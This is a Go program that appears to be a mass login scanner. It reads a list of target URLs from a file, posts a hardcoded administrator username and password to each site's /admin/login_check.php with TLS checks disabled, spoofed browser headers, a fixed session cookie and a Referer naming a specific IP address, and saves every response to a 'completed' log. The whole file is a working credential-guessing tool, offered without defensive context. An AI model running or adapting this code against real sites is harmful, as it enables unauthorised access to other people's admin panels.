package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

func main() {
	fmt.Println("start")
	urllist := list("url.txt")
	fmt.Println(urllist)
	for _, v := range urllist {
		fmt.Println(v)
		Httpget(v)
	}
}
func Httpget(url string) {
	fullurl := url + "/admin/login_check.php"
	cli := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}}
	request, err := http.NewRequest("POST", fullurl, strings.NewReader("id=root&passwd=admin09%23%24"))
	if err != nil {
		fmt.Println(err)
		return
	}

	request.Header.Add("Content-Length", "28")
	request.Header.Add("Cache-Control", "max-age=0")
	request.Header.Add("Upgrade-Insecure-Requests", "1")
	request.Header.Add("Origin", url)
	request.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	request.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36")
	request.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
	request.Header.Add("Referer", "http://125.133.103.225//admin/index.php")
	request.Header.Add("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8")
	request.Header.Add("Cookie", "PHPSESSID=b10c44196c98560d230002a415b32945")
	request.Header.Add("Connection", "close")

	do, err := cli.Do(request)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer func() {
		_ = do.Body.Close()
	}()
	all, _ := ioutil.ReadAll(do.Body)
	html := string(all)
	//fmt.Println(html)
	ok, _ := os.OpenFile("已完成.txt", os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0600)
	defer ok.Close()
	ok.Write([]byte(html + "\n=============================================================================\n"))
}

func list(ipfile string) []string {
	var ip_list []string
	ip_file, err := os.Open(ipfile)
	if err != nil {
		fmt.Print("文件打开失败,请确认存放IP文件的路径,文件名是否正确!\n")
		os.Exit(0)
	}

	defer ip_file.Close()
	readerip := bufio.NewReader(ip_file)
	for {
		ip, err := readerip.ReadString('\n')
		ip = strings.Replace(ip, " ", "", -1)
		ip = strings.Replace(ip, "\n", "", -1)
		ip = strings.Replace(ip, "\r", "", -1)
		ip_list = append(ip_list, ip)
		if err == io.EOF {
			break
		}
	}
	return ip_list
}
